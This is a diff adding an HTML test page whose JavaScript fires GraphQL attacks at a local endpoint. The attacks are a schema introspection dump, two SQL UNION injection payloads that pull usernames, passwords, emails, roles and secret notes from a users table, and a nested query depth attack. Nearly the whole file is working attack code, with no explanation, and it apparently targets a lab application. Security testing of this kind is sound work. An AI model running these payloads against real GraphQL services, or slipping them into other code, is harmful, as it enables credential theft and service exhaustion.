@@ -1,0 +1,140 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>GraphQL Injection Testing</title>
+</head>
+<body>
+    <h2>GraphQL Injection and Schema Testing</h2>
+    
+    <button onclick="testIntrospection()">Test Schema Introspection</button>
+    <button onclick="testSQLInjectionQuery()">Test SQL Injection in Query</button>
+    <button onclick="testUnionInjection()">Test Union-based Injection</button>
+    <button onclick="testDepthAttack()">Test Query Depth Attack</button>
+    
+    <div id="results"></div>
+
+    <script>
+    function testIntrospection() {
+        const query = `
+            query IntrospectionQuery {
+                __schema {
+                    queryType { name }
+                    mutationType { name }
+                    types {
+                        name
+                        kind
+                        fields {
+                            name
+                            type { name }
+                        }
+                    }
+                }
+            }
+        `;
+        
+        fetch('http://localhost:8080/graphql', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({ query })
+        })
+        .then(response => response.json())
+        .then(data => {
+            document.getElementById('results').innerHTML = 
+                '<h3>Schema Introspection:</h3><pre>' + JSON.stringify(data, null, 2) + '</pre>';
+        });
+    }
+    
+    function testSQLInjectionQuery() {
+        const query = `
+            query {
+                user(username: "admin' UNION SELECT null,username,password,email,role,null,null FROM users--") {
+                    id
+                    username
+                    email
+                    role
+                }
+            }
+        `;
+        
+        fetch('http://localhost:8080/graphql', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({ query })
+        })
+        .then(response => response.json())
+        .then(data => {
+            document.getElementById('results').innerHTML += 
+                '<h3>SQL Injection Test:</h3><pre>' + JSON.stringify(data, null, 2) + '</pre>';
+        });
+    }
+    
+    function testUnionInjection() {
+        const query = `
+            query {
+                products(category: "Electronics' UNION SELECT id,username,password,email,role,secretNotes FROM users--") {
+                    id
+                    name
+                    price
+                    internalNotes
+                }
+            }
+        `;
+        
+        fetch('http://localhost:8080/graphql', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({ query })
+        })
+        .then(response => response.json())
+        .then(data => {
+            document.getElementById('results').innerHTML += 
+                '<h3>Union-based Injection:</h3><pre>' + JSON.stringify(data, null, 2) + '</pre>';
+        });
+    }
+    
+    function testDepthAttack() {
+        const query = `
+            query {
+                users {
+                    id
+                    username
+                    orders: orders(userId: 1) {
+                        id
+                        product: product(id: 1) {
+                            id
+                            name
+                            orders: orders(userId: 1) {
+                                id
+                                product: product(id: 1) {
+                                    id
+                                    name
+                                }
+                            }
+                        }
+                    }
+                }
+            }
+        `;
+        
+        fetch('http://localhost:8080/graphql', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({ query })
+        })
+        .then(response => response.json())
+        .then(data => {
+            document.getElementById('results').innerHTML += 
+                '<h3>Query Depth Attack:</h3><pre>' + JSON.stringify(data, null, 2) + '</pre>';
+        });
+    }
+    </script>
+</body>
+</html>
